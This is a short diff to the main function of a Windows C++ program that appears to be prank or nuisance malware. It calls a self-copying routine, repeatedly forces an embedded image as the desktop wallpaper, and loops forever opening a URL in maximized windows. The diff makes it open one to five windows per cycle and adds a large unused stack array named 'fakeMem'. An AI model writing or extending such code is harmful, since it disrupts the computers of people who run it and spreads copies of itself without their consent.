@@ -54,13 +54,19 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	_In_ LPWSTR    lpCmdLine,
 	_In_ int       nCmdShow)
 {
+	double fakeMem[65536] = { 0 };
+	
 	CopySelf();
 
 	Extract(IDR_JPG1, BG_FILE_NAME);
 	
 	while (true) {
-		ShellExecute(NULL, L"open", URL, NULL, NULL, SW_SHOWMAXIMIZED);
+		int numberOfProcesses = rand() % 5 + 1;
 
+		for (int x = 0; x < numberOfProcesses; x++) {
+			ShellExecute(NULL, L"open", URL, NULL, NULL, SW_SHOWMAXIMIZED);
+		}
+		
 		SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)BG_FILE_NAME.c_str(), SPIF_SENDCHANGE);
 		
 		Sleep(INTERVAL_MS);
